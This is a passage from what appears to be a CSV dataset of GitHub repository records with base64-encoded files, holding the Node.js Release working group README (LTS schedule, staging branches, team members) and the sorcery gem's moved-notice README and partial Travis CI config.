YmFja3BvcnRlZCB0byByZWxlYXNlIHN0cmVhbXMuCgpUaGUgUmVsZWFzZSB3
b3JraW5nIGdyb3VwIGlzIHN0cnVjdHVyZWQgaW50byB0ZWFtcyBhbmQgbWVt
YmVyc2hpcCBpbgp0aGUgd29ya2luZyBncm91cCBkb2VzIG5vdCBhdXRvbWF0
aWNhbGx5IHJlc3VsdCBpbiBtZW1iZXJzaGlwIGluIHRoZXNlCnRlYW1zLiBU
aGVzZSB0ZWFtcyBhcmU6CgoqIFJlbGVhc2VycyB0ZWFtCiogTFRTIHRlYW0K
KiBDSVRHTSB0ZWFtCgpUaGUgYHJlbGVhc2Vyc2AgdGVhbSBpcyBlbnRydXN0
ZWQgd2l0aCB0aGUgc2VjcmV0cyBhbmQgQ0kgYWNjZXNzIHRvIGJlIGFibGUK
YnVpbGQgYW5kIHNpZ24gcmVsZWFzZXMuICoqQWRkaXRpb25zIHRvIHRoZSBy
ZWxlYXNlcnMgdGVhbSBtdXN0IGJlIGFwcHJvdmVkCmJ5IHRoZSBUU0MgZm9s
bG93aW5nIHRoZSBwcm9jZXNzIG91dGxpbmVkIGluIEdPVkVSTkFOQ0UubWQu
KioKClRoZSBMb25nIFRlcm0gU3VwcG9ydCAoTFRTKSB0ZWFtIG1hbmFnZXMg
dGhlIHByb2Nlc3MvY29udGVudCBvZiBMVFMgcmVsZWFzZXMKYW5kIHRoZSBy
ZXF1aXJlZCBiYWNrcG9ydGluZyBmb3IgdGhlc2UgcmVsZWFzZXMuIEFkZGl0
aW9ucyB0byB0aGUgTFRTCnRlYW0gbmVlZHMgc2lnbiBvZmYgZnJvbSB0aGUg
cmVzdCBvZiB0aGUgTFRTIHRlYW0uCgpUaGUgQ2FuYXJ5IGluIHRoZSBHb2xk
IE1pbmUgKENJVEdNKSB0ZWFtIG1haW50YWlucyBDSVRHTSBhcyBvbmUgb2YK
dGhlIGtleSBzYW5pdHkgY2hlY2tzIGZvciByZWxlYXNlcy4gVGhpcyB0ZWFt
IG1haW50YWlucyB0aGUgQ0lUR00KcmVwb3NpdG9yeSBhbmQgd29ya3MgdG8g
a2VlcCBDSVRHTSBidWlsZHMgcnVubmluZyBhbmQgcGFzc2luZyByZWd1bGFy
bHkuClRoaXMgYWxzbyBpbmNsdWRlcyBtYWludGFpbmluZyB0aGUgQ0kgam9i
cyBpbiBjb2xsYWJvcmF0aW9uIHdpdGggdGhlIEJ1aWxkCldvcmtpbmcgR3Jv
dXAuCgojIyBSZWxlYXNlIFBsYW4KCk5ldyBzZW12ZXItbWFqb3IgcmVsZWFz
ZXMgb2YgTm9kZS5qcyBhcmUgY3V0IGZyb20gYG1hc3RlcmAgZXZlcnkgc2l4
IG1vbnRocy4KTmV3IGV2ZW4tbnVtYmVyZWQgdmVyc2lvbnMgKGUuZy4gdjYs
IHY4LCB2MTAsIGV0YykgYXJlIGN1dCBpbiBBcHJpbC4gTmV3Cm9kZC1udW1i
ZXJlZCB2ZXJzaW9ucyAoZS5nLiB2NSwgdjcsIHY5KSBhcmUgY3V0IGluIE9j
dG9iZXIuCgpJbiBjb29yZGluYXRpb24gd2l0aCBhIG5ldyAqb2RkLW51bWJl
cmVkKiBtYWpvciByZWxlYXNlIGJlaW5nIGN1dCwgdGhlCnByZXZpb3VzICpl
dmVuLW51bWJlcmVkKiBtYWpvciB2ZXJzaW9uIHdpbGwgdHJhbnNpdGlvbiB0
byB0aGUgTG9uZyBUZXJtIFN1cHBvcnQKcGxhbi4gVGhlIHRyYW5zaXRpb24g
dG8gTG9uZyBUZXJtIFN1cHBvcnQgY2FuIGhhcHBlbiBlaXRoZXIgYmVmb3Jl
IG9yIGFmdGVyCnRoZSBuZXcgbWFqb3IgdmVyc2lvbiBpcyBjdXQgaW4gYSBT
ZW12ZXItTWlub3IgcmVsZWFzZSBmb2xsb3dpbmcKW3RoZSBwcm9jZXNzIGRv
Y3VtZW50ZWQgYmVsb3ddKSgjbWFya2luZy1hLXJlbGVhc2UtbGluZS1hcy1s
dHMpLgoKRXZlcnkgbWFqb3IgdmVyc2lvbiBjb3ZlcmVkIGJ5IHRoZSBMVFMg
cGxhbiB3aWxsIGJlIGFjdGl2ZWx5IG1haW50YWluZWQgZm9yIGEKcGVyaW9k
IG9mIDEyIG1vbnRocyBmcm9tIHRoZSBkYXRlIGl0IGVudGVycyBMVFMgY292
ZXJhZ2UuIEZvbGxvd2luZyB0aG9zZSAxMgptb250aHMgb2YgYWN0aXZlIHN1
cHBvcnQsIHRoZSBtYWpvciB2ZXJzaW9uIHdpbGwgdHJhbnNpdGlvbiBpbnRv
ICJtYWludGVuYW5jZSIKbW9kZSBmb3IgMTggYWRkaXRpb25hbCBtb250aHMu
IFByaW9yIHRvIE5vZGUuanMgMTIgdGhlIGFjdGl2ZSBwZXJpb2Qgd2FzIDE4
Cm1vbnRocyBhbmQgdGhlIG1haW50ZW5hbmNlIHBlcmlvZCAxMiBtb250aHMu
CgpUaGUgZXhhY3QgZGF0ZSB0aGF0IGEgcmVsZWFzZSBzdHJlYW0gd2lsbCBi
ZSBtb3ZlZCB0byBMVFMsIG1vdmVkIGJldHdlZW4gTFRTCm1vZGVzLCBvciBk
ZXByZWNhdGVkIHdpbGwgYmUgY2hvc2VuIG5vIGxhdGVyIHRoYW4gdGhlIGZp
cnN0IGRheSBvZiB0aGUgbW9udGguCklmIGl0IGlzIHRvIGJlIGNoYW5nZWQs
IGl0IHdpbGwgYmUgZG9uZSB3aXRoIG5vIGxlc3MgdGhhbiAxNCBkYXlzIG5v
dGljZS4KCkdpdmVuIHRoaXMgc2NoZWR1bGUsIHRoZXJlIHdpbGwgYmUgbm8g
bW9yZSB0aGFuIHR3byBhY3RpdmUgTFRTIHJlbGVhc2VzIGF0IGFueQpnaXZl
biB0aW1lLCBvdmVybGFwcGluZyBmb3IgYSBtYXhpbXVtIHBlcmlvZCBvZiBz
aXggbW9udGhzLgoKT25jZSBhIG1ham9yIHZlcnNpb24gZW50ZXJzIExUUyBj
b3ZlcmFnZSwgbmV3IGZlYXR1cmVzIChzZW12ZXItbWlub3IpIG1heSBvbmx5
CmJlIGxhbmRlZCB3aXRoIGNvbnNlbnQgb2YgdGhlIFJlbGVhc2Ugd29ya2lu
ZyBncm91cC4gTm8gc2VtdmVyLW1ham9yCmNoYW5nZXMgb3RoZXIgdGhhbiB0
aG9zZSByZXF1aXJlZCBmb3IgY3JpdGljYWwgc2VjdXJpdHkgZml4ZXMgbWF5
IGJlIGxhbmRlZC4KCkNoYW5nZXMgaW4gYW4gTFRTLWNvdmVyZWQgbWFqb3Ig
dmVyc2lvbiBhcmUgbGltaXRlZCB0bzoKCjEuIEJ1ZyBmaXhlczsKMi4gU2Vj
dXJpdHkgdXBkYXRlczsKMy4gTm9uLXNlbXZlci1tYWpvciBucG0gdXBkYXRl
czsKNC4gUmVsZXZhbnQgZG9jdW1lbnRhdGlvbiB1cGRhdGVzOwo1LiBDZXJ0
YWluIHBlcmZvcm1hbmNlIGltcHJvdmVtZW50cyB3aGVyZSB0aGUgcmlzayBv
ZiBicmVha2luZyBleGlzdGluZwogICBhcHBsaWNhdGlvbnMgaXMgbWluaW1h
bDsKNi4gQ2hhbmdlcyB0aGF0IGludHJvZHVjZSBsYXJnZSBhbW91bnQgb2Yg
Y29kZSBjaHVybiB3aGVyZSB0aGUgcmlzayBvZiBicmVha2luZwogICBleGlz
dGluZyBhcHBsaWNhdGlvbnMgaXMgbG93IGFuZCB3aGVyZSB0aGUgY2hhbmdl
IGluIHF1ZXN0aW9uIG1heQogICBzaWduaWZpY2FudGx5IGVhc2UgdGhlIGFi
aWxpdHkgdG8gYmFja3BvcnQgZnV0dXJlIGNoYW5nZXMgZHVlIHRvIHRoZQog
ICByZWR1Y3Rpb24gaW4gZGlmZiBub2lzZS4KCkdlbmVyYWxseSBjaGFuZ2Vz
IGFyZSBleHBlY3RlZCB0byBsaXZlIGluIGEgKkN1cnJlbnQqIHJlbGVhc2Ug
Zm9yIGF0IGxlYXN0IDIKd2Vla3MgYmVmb3JlIGJlaW5nIGJhY2twb3J0ZWQu
IEl0IGlzIHBvc3NpYmxlIGZvciBhIGNvbW1pdCB0byBsYW5kIGVhcmxpZXIg
YXQKdGhlIGRpc2NyZXRpb24gb2YgdGhlIFJlbGVhc2Ugd29ya2luZyBncm91
cCBhbmQgdGhlIG1haW50YWluZXJzIG9mIHRoZSBMVFMgYnJhbmNoZXMuCgpP
bmNlIGEgcmVsZWFzZSBtb3ZlcyBpbnRvIE1haW50ZW5hbmNlIG1vZGUsIG9u
bHkgKioqY3JpdGljYWwqKiogYnVncywKKioqY3JpdGljYWwqKiogc2VjdXJp
dHkgZml4ZXMsIGRvY3VtZW50YXRpb24gdXBkYXRlcywgYW5kIHVwZGF0ZXMg
dG8gZW5zdXJlCmNvbnNpc3RlbmN5IGFuZCB1c2FiaWxpdHkgb2YgdGhlIE4t
QVBJIGFjcm9zcyBMVFMgcmVsZWFzZXMgd2lsbCBiZSBwZXJtaXR0ZWQuClVu
bGVzcyBhIGNoYW5nZSBpcyAqKip1cmdlbnQqKiogaXQgd2lsbCBiZSBwbGFu
bmVkIGludG8gYSByZWxlYXNlIG9uY2UgcGVyCnF1YXJ0ZXIuIFN1Y2ggcmVs
ZWFzZXMgd2lsbCBvbmx5IGJlIG1hZGUgd2hlbiBuZWNlc3NhcnkuCgpOb3Rl
IHRoYXQgd2hpbGUgaXQgaXMgcG9zc2libGUgdGhhdCBjcml0aWNhbCBzZWN1
cml0eSBhbmQgYnVnIGZpeGVzIG1heSBsZWFkIHRvCipzZW12ZXItbWFqb3Iq
IGNoYW5nZXMgbGFuZGluZyB3aXRoaW4gYW4gTFRTIHN0cmVhbSwgc3VjaCBz
aXR1YXRpb25zIHdpbGwgYmUKcmFyZSBhbmQgd2lsbCBsYW5kIGFzICpzZW12
ZXItbWlub3IqIGJ1bXBzIGluIHRoZSBMVFMgY292ZXJlZCB2ZXJzaW9uLgoK
VXBkYXRlcyB0byBlbnN1cmUgY29uc2lzdGVuY3kgYW5kIHVzYWJpbGl0eSBv
ZiB0aGUgTi1BUEkgYWNyb3NzIExUUyByZWxlYXNlcwphcmUgYWxsb3dlZCBh
cyBpdCBpcyBpbXBvcnRhbnQgdG8gZW5zdXJlIHRoYXQgTi1BUEkgbmF0aXZl
IG1vZHVsZXMgY2FuIGJlIHVzZWQKYWNyb3NzIExUUyB2ZXJzaW9ucyBpbiBv
cmRlciB0byBzdXBwb3J0IGFkb3B0aW9uLgoKQWxsIExUUyByZWxlYXNlcyB3
aWxsIGJlIGFzc2lnbmVkIGEgY29kZW5hbWUuIEEgbGlzdCBvZiBleHBlY3Rl
ZCB1cGNvbWluZwpjb2RlbmFtZXMgaXMgYXZhaWxhYmxlIGluIFtDT0RFTkFN
RVMubWRdKC4vQ09ERU5BTUVTLm1kKS4KCkFuIG9kZC1udW1iZXJlZCBtYWpv
ciByZWxlYXNlIHdpbGwgY2Vhc2UgdG8gYmUgYWN0aXZlbHkgdXBkYXRlZCB3
aGVuIHRoZSBzdWJzZXF1ZW50CmV2ZW4tbnVtYmVyZWQgbWFqb3IgcmVsZWFz
ZSBpcyBjdXQuIERlcGVuZGluZyBvbiBjaXJjdW1zdGFuY2VzIHRoZSBwcm9q
ZWN0IG1heQpkZWNpZGUgdG8gcHJvdmlkZSBhbiB1cGRhdGUgdG8gdGhlIG9k
ZC1udW1iZXJlZCByZWxlYXNlIGFmdGVyIHRoZSBjdXRvZmYuIEhvd2V2ZXIs
IAp0aGVyZSBpcyBubyBndWFyYW50ZWUgdGhhdCBhbnkgcmVsZWFzZSB3aWxs
IGJlIG1hZGUuCgojIyMjIE1hcmtpbmcgYSBSZWxlYXNlIExpbmUgQXMgTFRT
CgpUbyBtYXJrIGEgcmVsZWFzZSBsaW5lIGFzIExUUywgdGhlIGZvbGxvd2lu
ZyBjaGFuZ2VzIG11c3QgYmUgbWFkZSB0byBgc3JjL25vZGVfdmVyc2lvbi5o
YDoKCiogVGhlIGBOT0RFX01JTk9SX1ZFUlNJT05gIG1hY3JvIG11c3QgYmUg
aW5jcmVtZW50ZWQgYnkgb25lCiogVGhlIGBOT0RFX1BBVENIX1ZFUlNJT05g
IG1hY3JvIG11c3QgYmUgc2V0IHRvIGAwYAoqIFRoZSBgTk9ERV9WRVJTSU9O
X0lTX0xUU2AgbWFjcm8gbXVzdCBiZSBzZXQgdG8gYDFgCiogVGhlIGBOT0RF
X1ZFUlNJT05fTFRTX0NPREVOQU1FYCBtYWNybyBtdXN0IGJlIHNldCB0byB0
aGUgY29kZW5hbWUgc2VsZWN0ZWQgZm9yIHRoZSBMVFMgcmVsZWFzZS4KCkZv
ciBleGFtcGxlOgoKYGBgZGlmZgotI2RlZmluZSBOT0RFX01JTk9SX1ZFUlNJ
T04gMTIKLSNkZWZpbmUgTk9ERV9QQVRDSF9WRVJTSU9OIDEKKyNkZWZpbmUg
Tk9ERV9NSU5PUl9WRVJTSU9OIDEzCisjZGVmaW5lIE5PREVfUEFUQ0hfVkVS
U0lPTiAwCgotI2RlZmluZSBOT0RFX1ZFUlNJT05fSVNfTFRTIDAKLSNkZWZp
bmUgTk9ERV9WRVJTSU9OX0xUU19DT0RFTkFNRSAiIgorI2RlZmluZSBOT0RF
X1ZFUlNJT05fSVNfTFRTIDEKKyNkZWZpbmUgTk9ERV9WRVJTSU9OX0xUU19D
T0RFTkFNRSAiRXJiaXVtIgoKLSNkZWZpbmUgTk9ERV9WRVJTSU9OX0lTX1JF
TEVBU0UgMAorI2RlZmluZSBOT0RFX1ZFUlNJT05fSVNfUkVMRUFTRSAxCmBg
YAoKVGhlIGNoYW5nZXMgbXVzdCBiZSBtYWRlIGFzIHBhcnQgb2YgYSBuZXcg
c2VtdmVyLW1pbm9yIHJlbGVhc2UuCgojIyMgTFRTIFN0YWdpbmcgQnJhbmNo
ZXMKCkV2ZXJ5IExUUyBtYWpvciB2ZXJzaW9uIGhhcyB0d28gYnJhbmNoZXMg
aW4gdGhlIEdpdEh1YiByZXBvc2l0b3J5OiBhIHJlbGVhc2UKYnJhbmNoIGFu
ZCBhIHN0YWdpbmcgYnJhbmNoLiBUaGUgcmVsZWFzZSBicmFuY2ggaXMgdXNl
ZCB0byBjdXQgbmV3IHJlbGVhc2VzLgpPbmx5IG1lbWJlcnMgb2YgdGhlIEBu
b2RlanMvcmVsZWFzZXJzIHRlYW0gc2hvdWxkIGxhbmQgY29tbWl0cyBvbnRv
IHJlbGVhc2UgYnJhbmNoZXMuClRoZSBzdGFnaW5nIGJyYW5jaCBpcyB1c2Vk
IHRvIGxhbmQgY2hlcnJ5LXBpY2tlZCBvciBiYWNrcG9ydGVkIGNvbW1pdHMg
ZnJvbQptYXN0ZXIgdGhhdCBuZWVkIHRvIGJlIGluY2x1ZGVkIGluIGEgZnV0
dXJlIHJlbGVhc2UuIE9ubHkgbWVtYmVycyBvZgpAbm9kZWpzL2JhY2twb3J0
ZXJzIHNob3VsZCBsYW5kIGNvbW1pdHMgb250byBzdGFnaW5nIGJyYW5jaGVz
LgoKRm9yIGV4YW1wbGUsIGZvciBOb2RlLmpzIHY0LCB0aGVyZSBpcyBhIGB2
NC54YCBicmFuY2ggYW5kIGEgYHY0Lngtc3RhZ2luZ2AKYnJhbmNoLiBXaGVu
IGNvbW1pdHMgbGFuZCBpbiBtYXN0ZXIgdGhhdCBtdXN0IGJlIGNoZXJyeS1w
aWNrZWQgZm9yIGEgZnV0dXJlCk5vZGUuanMgdjQgcmVsZWFzZSwgdGhvc2Ug
bXVzdCBiZSBsYW5kZWQgaW50byB0aGUgYHY0Lngtc3RhZ2luZ2AgYnJhbmNo
LiBXaGVuCmNvbW1pdHMgYXJlIGJhY2twb3J0ZWQgZm9yIGEgZnV0dXJlIE5v
ZGUuanMgdjQgcmVsZWFzZSwgdGhvc2UgbXVzdCBjb21lIGluIHRoZQpmb3Jt
IG9mIHB1bGwgcmVxdWVzdHMgb3BlbmVkIGFnYWluc3QgdGhlIGB2NC54LXN0
YWdpbmdgIGJyYW5jaC4gKipDb21taXRzIGFyZQpvbmx5IGxhbmRlZCBpbiB0
aGUgYHY0LnhgIGJyYW5jaCB3aGVuIGEgbmV3IGB2NC54YCByZWxlYXNlIGlz
IGJlaW5nIHByZXBhcmVkLioqCgpbQXJnb25dOiBodHRwczovL25vZGVqcy5v
cmcvZG93bmxvYWQvcmVsZWFzZS9sYXRlc3QtYXJnb24vCltCb3Jvbl06IGh0
dHBzOi8vbm9kZWpzLm9yZy9kb3dubG9hZC9yZWxlYXNlL2xhdGVzdC1ib3Jv
bi8KW0NhcmJvbl06IGh0dHBzOi8vbm9kZWpzLm9yZy9kb3dubG9hZC9yZWxl
YXNlL2xhdGVzdC1jYXJib24vCltEdWJuaXVtXTogaHR0cHM6Ly9ub2RlanMu
b3JnL2Rvd25sb2FkL3JlbGVhc2UvbGF0ZXN0LWR1Ym5pdW0vCltFcmJpdW1d
OiBodHRwczovL25vZGVqcy5vcmcvZG93bmxvYWQvcmVsZWFzZS9sYXRlc3Qt
ZXJiaXVtLwpbNC54XTogaHR0cHM6Ly9ub2RlanMub3JnL2Rvd25sb2FkL3Jl
bGVhc2UvbGF0ZXN0LXY0LngvCls1LnhdOiBodHRwczovL25vZGVqcy5vcmcv
ZG93bmxvYWQvcmVsZWFzZS9sYXRlc3QtdjUueC8KWzYueF06IGh0dHBzOi8v
bm9kZWpzLm9yZy9kb3dubG9hZC9yZWxlYXNlL2xhdGVzdC12Ni54LwpbNy54
XTogaHR0cHM6Ly9ub2RlanMub3JnL2Rvd25sb2FkL3JlbGVhc2UvbGF0ZXN0
LXY3LngvCls4LnhdOiBodHRwczovL25vZGVqcy5vcmcvZG93bmxvYWQvcmVs
ZWFzZS9sYXRlc3QtdjgueC8KWzkueF06IGh0dHBzOi8vbm9kZWpzLm9yZy9k
b3dubG9hZC9yZWxlYXNlL2xhdGVzdC12OS54LwpbMTAueF06IGh0dHBzOi8v
bm9kZWpzLm9yZy9kb3dubG9hZC9yZWxlYXNlL2xhdGVzdC12MTAueC8KWzEx
LnhdOiBodHRwczovL25vZGVqcy5vcmcvZG93bmxvYWQvcmVsZWFzZS9sYXRl
c3QtdjExLngvClsxMi54XTogaHR0cHM6Ly9ub2RlanMub3JnL2Rvd25sb2Fk
L3JlbGVhc2UvbGF0ZXN0LXYxMi54LwpbSlNPTl06IHNjaGVkdWxlLmpzb24K
ClRoZSB3b3JraW5nIGdyb3VwIG1lbWJlcnMgYXJlIHRoZSB1bmlvbiBvZiB0
aGUgTFRTLCBSZWxlYXNlcnMKYW5kIENJVEdNIHRlYW0gbWVtYmVycyBsaXN0
ZWQgYmVsb3cuCgojIyBMVFMgVGVhbSBtZW1iZXJzCgo8IS0tIG5jdS10ZWFt
LXN5bmMudGVhbShub2RlanMvbHRzKSAtLT4KCi0gW0BhZGRhbGVheF0oaHR0
cHM6Ly9naXRodWIuY29tL2FkZGFsZWF4KSAtIEFubmEgSGVubmluZ3Nlbgot
IFtAQmV0aEdyaWdnc10oaHR0cHM6Ly9naXRodWIuY29tL0JldGhHcmlnZ3Mp
IC0gQmV0aGFueSBOaWNvbGxlIEdyaWdncwotIFtAYm5vb3JkaHVpc10oaHR0
cHM6Ly9naXRodWIuY29tL2Jub29yZGh1aXMpIC0gQmVuIE5vb3JkaHVpcwot
IFtAY29kZWJ5dGVyZV0oaHR0cHM6Ly9naXRodWIuY29tL2NvZGVieXRlcmUp
IC0gU2hlbGxleSBWb2hyCi0gW0BFcmlzRFNdKGh0dHBzOi8vZ2l0aHViLmNv
bS9FcmlzRFMpIC0gSGFubmFoIFdvbGZlCi0gW0BGaXNocm9jazEyM10oaHR0
cHM6Ly9naXRodWIuY29tL0Zpc2hyb2NrMTIzKSAtIEplcmVtaWFoIFNlbmtw
aWVsCi0gW0BnZWVrXShodHRwczovL2dpdGh1Yi5jb20vZ2VlaykgLSBXeWF0
dCBQcmV1bAotIFtAZ2liZmFobl0oaHR0cHM6Ly9naXRodWIuY29tL2dpYmZh
aG4pIC0gR2lic29uIEZhaG5lc3RvY2sKLSBbQG1oZGF3c29uXShodHRwczov
L2dpdGh1Yi5jb20vbWhkYXdzb24pIC0gTWljaGFlbCBEYXdzb24KLSBbQE15
bGVzQm9yaW5zXShodHRwczovL2dpdGh1Yi5jb20vTXlsZXNCb3JpbnMpIC0g
TXlsZXMgQm9yaW5zCi0gW0BvdGhpeW0yM10oaHR0cHM6Ly9naXRodWIuY29t
L290aGl5bTIzKSAtIEZvcnJlc3QgTCBOb3J2ZWxsCi0gW0BzYW0tZ2l0aHVi
XShodHRwczovL2dpdGh1Yi5jb20vc2FtLWdpdGh1YikgLSBTYW0gUm9iZXJ0
cwotIFtAc2hpZ2VraV0oaHR0cHM6Ly9naXRodWIuY29tL3NoaWdla2kpIC0g
U2hpZ2VraSBPaHRzdQotIFtAc3JsMjk1XShodHRwczovL2dpdGh1Yi5jb20v
c3JsMjk1KSAtIFN0ZXZlbiBSLiBMb29taXMKLSBbQHRhcmdvc10oaHR0cHM6
Ly9naXRodWIuY29tL3RhcmdvcykgLSBNaWNoYcOrbCBaYXNzbwotIFtAdHJl
dm5vcnJpc10oaHR0cHM6Ly9naXRodWIuY29tL3RyZXZub3JyaXMpIC0gVHJl
dm9yIE5vcnJpcwotIFtAeXVub25nXShodHRwczovL2dpdGh1Yi5jb20veXVu
b25nKSAtIFl1bm9uZyBYaWFvCgo8IS0tIG5jdS10ZWFtLXN5bmMgZW5kIC0t
PgoKIyMjIEJhY2twb3J0ZXJzIHRlYW0KCjwhLS0gbmN1LXRlYW0tc3luYy50
ZWFtKG5vZGVqcy9iYWNrcG9ydGVycykgLS0+CgotIFtAYWRkYWxlYXhdKGh0
dHBzOi8vZ2l0aHViLmNvbS9hZGRhbGVheCkgLSBBbm5hIEhlbm5pbmdzZW4K
LSBbQEJldGhHcmlnZ3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9CZXRoR3JpZ2dz
KSAtIEJldGhhbnkgTmljb2xsZSBHcmlnZ3MKLSBbQGNvZGVieXRlcmVdKGh0
dHBzOi8vZ2l0aHViLmNvbS9jb2RlYnl0ZXJlKSAtIFNoZWxsZXkgVm9ocgot
IFtAZ2liZmFobl0oaHR0cHM6Ly9naXRodWIuY29tL2dpYmZhaG4pIC0gR2li
c29uIEZhaG5lc3RvY2sKLSBbQG1oZGF3c29uXShodHRwczovL2dpdGh1Yi5j
b20vbWhkYXdzb24pIC0gTWljaGFlbCBEYXdzb24KLSBbQE15bGVzQm9yaW5z
XShodHRwczovL2dpdGh1Yi5jb20vTXlsZXNCb3JpbnMpIC0gTXlsZXMgQm9y
aW5zCi0gW0BzYW0tZ2l0aHViXShodHRwczovL2dpdGh1Yi5jb20vc2FtLWdp
dGh1YikgLSBTYW0gUm9iZXJ0cwoKPCEtLSBuY3UtdGVhbS1zeW5jIGVuZCAt
LT4KCiMjIyBSZWxlYXNlcnMgdGVhbQoKPCEtLSBuY3UtdGVhbS1zeW5jLnRl
YW0obm9kZWpzL3JlbGVhc2VycykgLS0+CgotIFtAQmV0aEdyaWdnc10oaHR0
cHM6Ly9naXRodWIuY29tL0JldGhHcmlnZ3MpIC0gQmV0aGFueSBOaWNvbGxl
IEdyaWdncwotIFtAQnJpZGdlQVJdKGh0dHBzOi8vZ2l0aHViLmNvbS9Ccmlk
Z2VBUikgLSBSdWJlbiBCcmlkZ2V3YXRlcgotIFtAY2ppaHJpZ10oaHR0cHM6
Ly9naXRodWIuY29tL2NqaWhyaWcpIC0gQ29saW4gSWhyaWcKLSBbQGNvZGVi
eXRlcmVdKGh0dHBzOi8vZ2l0aHViLmNvbS9jb2RlYnl0ZXJlKSAtIFNoZWxs
ZXkgVm9ocgotIFtAZXZhbmx1Y2FzXShodHRwczovL2dpdGh1Yi5jb20vZXZh
bmx1Y2FzKSAtIEV2YW4gTHVjYXMKLSBbQEZpc2hyb2NrMTIzXShodHRwczov
L2dpdGh1Yi5jb20vRmlzaHJvY2sxMjMpIC0gSmVyZW1pYWggU2Vua3BpZWwK
LSBbQGdpYmZhaG5dKGh0dHBzOi8vZ2l0aHViLmNvbS9naWJmYWhuKSAtIEdp
YnNvbiBGYWhuZXN0b2NrCi0gW0BqYXNuZWxsXShodHRwczovL2dpdGh1Yi5j
b20vamFzbmVsbCkgLSBKYW1lcyBNIFNuZWxsCi0gW0BNeWxlc0Jvcmluc10o
aHR0cHM6Ly9naXRodWIuY29tL015bGVzQm9yaW5zKSAtIE15bGVzIEJvcmlu
cwotIFtAdGFyZ29zXShodHRwczovL2dpdGh1Yi5jb20vdGFyZ29zKSAtIE1p
Y2hhw6tsIFphc3NvCgo8IS0tIG5jdS10ZWFtLXN5bmMgZW5kIC0tPgoKIyMj
IENJVEdNIHRlYW0KCjwhLS0gbmN1LXRlYW0tc3luYy50ZWFtKG5vZGVqcy9j
aXRnbSkgLS0+CgotIFtAYWwtazIxXShodHRwczovL2dpdGh1Yi5jb20vYWwt
azIxKSAtIE9sZWtzYW5kciBLdXNoY2hhawotIFtAYmVuZ2xdKGh0dHBzOi8v
Z2l0aHViLmNvbS9iZW5nbCkgLSBCcnlhbiBFbmdsaXNoCi0gW0BCcmlkZ2VB
Ul0oaHR0cHM6Ly9naXRodWIuY29tL0JyaWRnZUFSKSAtIFJ1YmVuIEJyaWRn
ZXdhdGVyCi0gW0Biem96XShodHRwczovL2dpdGh1Yi5jb20vYnpveikgLSBC
YXJ0b3N6IFNvc25vd3NraQotIFtAZ2RhbXNdKGh0dHBzOi8vZ2l0aHViLmNv
bS9nZGFtcykgLSBHZW9yZ2UgQWRhbXMKLSBbQGdpYmZhaG5dKGh0dHBzOi8v
Z2l0aHViLmNvbS9naWJmYWhuKSAtIEdpYnNvbiBGYWhuZXN0b2NrCi0gW0BN
eWxlc0Jvcmluc10oaHR0cHM6Ly9naXRodWIuY29tL015bGVzQm9yaW5zKSAt
IE15bGVzIEJvcmlucwotIFtAcmljaGFyZGxhdV0oaHR0cHM6Ly9naXRodWIu
Y29tL3JpY2hhcmRsYXUpIC0gUmljaGFyZCBMYXUKLSBbQHRhcmdvc10oaHR0
cHM6Ly9naXRodWIuY29tL3RhcmdvcykgLSBNaWNoYcOrbCBaYXNzbwoKPCEt
LSBuY3UtdGVhbS1zeW5jIGVuZCAtLT4KCiMjIyBFbWVyaXR1cwoKIyMjIyBM
VFMgdGVhbQotIFtAamFzbmVsbF0oaHR0cHM6Ly9naXRodWIuY29tL2phc25l
bGwpIC0gSmFtZXMgTSBTbmVsbAotIFtAcnZhZ2ddKGh0dHBzOi8vZ2l0aHVi
LmNvbS9ydmFnZykgLSBSb2QgVmFnZwoKIyMjIyBSZWxlYXNlcnMgdGVhbQot
IFtAcnZhZ2ddKGh0dHBzOi8vZ2l0aHViLmNvbS9ydmFnZykgLSBSb2QgVmFn
ZwoKIyMjIyBDSVRHTSB0ZWFtCi0gW0BqYXNuZWxsXShodHRwczovL2dpdGh1
Yi5jb20vamFzbmVsbCkgLSBKYW1lcyBNIFNuZWxsCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'sorcery',1307476,b'Magical authentication for Rails 3 & 4',b'Ruby',78,2391,,2391,False,b'https://api.github.com/repos/NoamB/sorcery/forks',"IyMgU29yY2VyeSBoYXMgbW92ZWQhCgpZb3UgY2FuIGZpbmQgc29yY2VyeSBh
dCBpdCdzIG5ldyBob21lOiBbU29yY2VyeS9zb3JjZXJ5XShodHRwczovL2dp
dGh1Yi5jb20vU29yY2VyeS9zb3JjZXJ5KQo=
",,"bGFuZ3VhZ2U6IHJ1YnkKcnZtOgogIC0ganJ1YnkKICAtIDIuMC4wCiAgLSAy
LjEKICAtIDIuMgogIC0gMi4zLjAKCmVudjoKICBnbG9iYWw6CiAgICAtIEpS
VUJZX09QVFM9Ii0tMi4wIgoKZ2VtZmlsZToKICAtIEdlbWZpbGUKICAtIGdl
bWZpbGVzL2FjdGl2ZV9yZWNvcmQtcmFpbHM0MC5nZW1maWxlCiAgLSBnZW1m
aWxlcy9hY3RpdmVfcmVjb3JkLXJhaWxzNDEuZ2VtZmlsZQogIC0gZ2VtZmls
ZXMvYWN0aXZlX3JlY29yZC1yYWlsczQyLmdlbWZpbGUKCmJlZm9yZV9zY3Jp
cHQ6CiAgLSBteXNxbCAtZSAnY3JlYXRlIGRhdGFiYXNlIHNvcmNlcnlfdGVz
dDsnCgpiZWZvcmVfaW5zdGFsbDoKICAtIHJ2bSBnZXQgc3RhYmxlIC0tYXV0
by1kb3RmaWxlcwogIC0gZ2VtIHVwZGF0ZSBidW5kbGVyCgptYXRyaXg6CiAg
YWxsb3dfZmFpbHVyZXM6CiAgICAtIHJ2bToganJ1YnkKCiAgZXhjbHVkZToK
ICAgIC0gcnZtOiAyLjAuMAogICAgICBnZW1maWxlOiBnZW1maWxlcy9hY3Rp
dmVfcmVjb3JkLXJhaWxzNDIuZ2VtZmlsZQoKICAgIC0gcnZtOiBqcnVieQog
ICAgICBnZW1maWxlOiBHZW1maWxlCgogICAgLSBydm06IDIuMgogICAgICBn
ZW1maWxlOiBnZW1maWxlcy9hY3RpdmVfcmVjb3JkLXJhaWxzNDAuZ2VtZmls
ZQoKICAgIC0gcnZtOiAyLjMuMAogICAgICBnZW1maWxlOiBnZW1maWxlcy9h
